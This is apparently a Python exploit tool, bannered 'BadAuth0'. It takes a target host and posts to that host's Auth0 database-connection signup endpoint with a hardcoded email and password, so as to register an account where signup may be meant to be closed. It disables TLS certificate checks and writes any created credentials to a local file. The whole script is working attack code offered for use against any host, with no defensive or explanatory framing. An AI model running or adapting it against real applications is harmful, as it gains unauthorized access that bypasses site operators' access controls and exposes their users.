import subprocess
import requests
import sys
import os
import urllib3
import time
import threading
from subprocess import run

# ANSI color codes for terminal output
BLUE = "\033[0;34m"
RED = "\033[91m"
GREEN = "\033[32m"
END = "\033[0m"

# Banner
print(f"""{GREEN}
  ____            _    _   _   _ _   _      ___  
 | __ )  __ _  __| |  / \ | | | | |_| |__  / _ \ 
 |  _ \ / _` |/ _` | / _ \| | | | __| '_ \| | | |
 | |_) | (_| | (_| |/ ___ \ |_| | |_| | | | |_| |
 |____/ \__,_|\__,_/_/   \_\___/ \__|_| |_|\___/ 
{END}                                                                
""")
time.sleep(0.2)

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Spinner animation
def spinner(stop_event):
    while not stop_event.is_set():
        for cursor in '|/-\\':
            sys.stdout.write(cursor)
            sys.stdout.flush()
            time.sleep(0.1)
            sys.stdout.write('\b')
            if stop_event.is_set():
                break

# Create directory for saving output
def mk_dir(host):
    stop_event = threading.Event()
    spinner_thread = threading.Thread(target=spinner, args=(stop_event,))
    spinner_thread.start()
    try:
        print(f"{GREEN}[+] Creating directory{END}")
        os.makedirs(host, exist_ok=True)
        time.sleep(0.2)
        path = os.path.abspath(host)
        print(f"{GREEN}[+] Directory successfully created\nPath: {path} {END}")
    except Exception as e:
        print(f"{RED}Error occurred: {e}{END}")
    finally:
        stop_event.set()
        spinner_thread.join()

# Exploit function
def exploit(host):
    stop_event = threading.Event()
    spinner_thread = threading.Thread(target=spinner, args=(stop_event,))
    spinner_thread.start()

    # Request headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
        'Content-Type': 'application/json',
    }

    payload = {
        'client_id': '',
        'email': 'hack1@gmail.com',
        'password': 'rQ8a2;3/c[<J',
        'connection': 'Username-Password-Authentication',
    }

    try:
        print(f"{GREEN}[+] Initializing the exploit...{END}")
        response = requests.post(
            f'https://{host}/dbconnections/signup',
            headers=headers,
            json=payload,
            verify=False,
        )
        time.sleep(0.2)

        status_code = response.status_code
        if status_code in [200, 201]:
            print(f"{GREEN}[+] Account successfully created\n{END}")
            print(f"{GREEN}[+] Email: hack1@gmail.com\n{END}")
            print(f"{GREEN}[+] Pass: rQ8a2;3/c[<J\n{END}")
            print(f"{GREEN}{response.status_code}{END}")
            print(f"{GREEN}\n{response.text}{END}")
            with open(f"{host}/credentials.txt", "w") as file:
                file.write(f"{payload}")
        elif "connection" in response.json():
            print(f"{RED}[-] Unable to find the required connection{END}")
            print(response.text)
        elif status_code in [404, 403]:
            print(f"{RED}[-] The application returns: {status_code}{END}")
        else:
            print(f"{RED}\n[-] The application is not exploitable\n {END}")
            print(f"{RED}[-] The status code is: {status_code}{END}")
            print("\n", response.text, "\n")
    except Exception as e:
        print(f"{RED}Error occurred: {e}{END}")
        print(f"{RED}\n[-] The application is not exploitable\n {END}")
        print(f"{RED}[-] The status code is: {status_code}{END}")
        print("\n", response.text, "\n")
    finally:
        stop_event.set()
        spinner_thread.join()

def main():
    if len(sys.argv) != 2:
        print(f"{RED}[+] Usage: %s <host> {END}" % sys.argv[0])
        print(f"{RED}[+] Example: %s example.com {END}" % sys.argv[0])
        sys.exit(1)

    host = sys.argv[1]
    mk_dir(host)
    exploit(host)

if __name__ == "__main__":
    main()
